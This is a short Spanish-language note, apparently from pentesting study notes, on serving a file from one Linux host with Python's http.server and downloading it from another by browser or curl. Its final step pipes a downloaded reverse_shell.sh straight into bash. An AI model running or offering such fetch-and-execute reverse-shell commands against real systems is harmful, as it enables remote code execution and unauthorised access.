Maquina 192.168.1.136 Linux (emisor):

1. Abrimos puerto 80 (http) usando Python para que otro host de nuestra red pueda descargarse un archivo.
```
python3 -m http.server 80
```


Maquina 2 Linux (receptor):

Opción 1:

1. Buscamos en un navegador (Firefox, Chrome...) la IP del emisor y nos descargamos el archivo que queremos.

Opción 2:

1. Para descargarte el archivo:
```
curl http://192.168.1.136/compartir.mp4
```

2. Si es un ejecutable (como una **reverse shell** en **Bash**):
```
curl http://192.168.1.136/reverse_shell.sh | bash
```